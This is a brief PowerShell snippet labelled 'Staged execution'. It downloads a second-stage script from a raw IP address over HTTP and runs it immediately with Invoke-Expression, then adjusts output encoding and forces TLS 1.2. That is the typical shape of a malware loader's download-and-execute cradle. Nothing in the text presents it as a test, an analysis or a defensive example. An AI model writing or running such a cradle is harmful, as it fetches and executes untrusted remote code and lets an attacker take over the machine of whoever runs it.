
<# Staged execution #> $Stage2Url = 'http://203.0.113.54:8080/stage2.ps1'; IEX (Invoke-WebRequest -Uri $Stage2Url -UseBasicParsing).Content; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
